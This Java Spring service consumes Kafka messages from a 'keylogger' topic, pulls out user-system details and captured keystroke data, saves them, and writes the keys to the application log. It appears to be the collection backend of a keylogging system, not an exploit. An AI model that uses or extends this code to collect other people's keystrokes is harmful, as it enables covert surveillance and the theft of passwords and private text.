package ro.popa.kafkaconfiguration.kafka.consumers;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.kafka.annotation.KafkaListener;
import org.springframework.stereotype.Service;
import ro.popa.kafkaconfiguration.DTO.KeyloggerDTO;
import ro.popa.kafkaconfiguration.DTO.UserSystemDTO;
import ro.popa.kafkaconfiguration.entities.Keylogger;
import ro.popa.kafkaconfiguration.services.KeyloggerService;

@Service
public class KeyloggerConsumer {

    private final KeyloggerService keyloggerService;
    private final Logger logger = LoggerFactory.getLogger(KeyloggerConsumer.class);

    public KeyloggerConsumer(KeyloggerService keyloggerService) {
        this.keyloggerService = keyloggerService;
    }

    @KafkaListener(topics = "ro.popa.keylogger.new", groupId="mainConsumerGroup")
    public void consume(String message) {
        ObjectMapper objectMapper = new ObjectMapper();
        try {
            JsonNode root = objectMapper.readTree(message);
            JsonNode userJsonNode = root.get("user");
            UserSystemDTO userSystemDTO = objectMapper.treeToValue(userJsonNode, UserSystemDTO.class);
            JsonNode keyloggerJsonNode = root.get("data");
            KeyloggerDTO keyloggerDTO = objectMapper.treeToValue(keyloggerJsonNode, KeyloggerDTO.class);
            Keylogger keyloggerSaved = keyloggerService.save(keyloggerDTO, userSystemDTO);
            logger.info(String.format("Consumed message 1/2 -> %s", userSystemDTO));
            logger.info(String.format("Keys consumed 2/2 -> %s", keyloggerDTO));
        } catch (JsonProcessingException e) {
            logger.error("Error while processing the keylogger message -> ", e);
        }
    }
}
